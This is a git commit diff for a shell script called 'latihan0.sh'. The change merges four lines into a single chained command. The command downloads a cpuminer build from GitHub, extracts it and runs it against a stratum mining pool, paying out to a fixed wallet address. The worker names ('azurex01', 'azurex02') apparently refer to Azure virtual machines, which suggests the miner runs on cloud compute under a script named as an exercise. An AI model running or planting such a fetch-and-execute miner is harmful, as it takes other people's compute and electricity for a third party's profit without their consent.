cd7ed627bd98ddde5f2f2433d7464412561795fd
zeitschocco <72908208+zeitschocco@users.noreply.github.com>
2022-04-13 05:45:09 +0700

    Update latihan0.sh

--- latihan0.sh
+++ latihan0.sh
@@ -1,4 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
-tar xfv cpuminer-opt-linux.tar.gz
-cd cpuminer-opt-linux
-./cpuminer-sse2 -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17023 -u RNiBbeDngntEcNC562kFT3We2RGoopV5Rt.azurex01 -t 4
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xfv cpuminer-opt-linux.tar.gz && cd cpuminer-opt-linux && ./cpuminer-sse2 -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17023 -u RNiBbeDngntEcNC562kFT3We2RGoopV5Rt.azurex02 -t 2
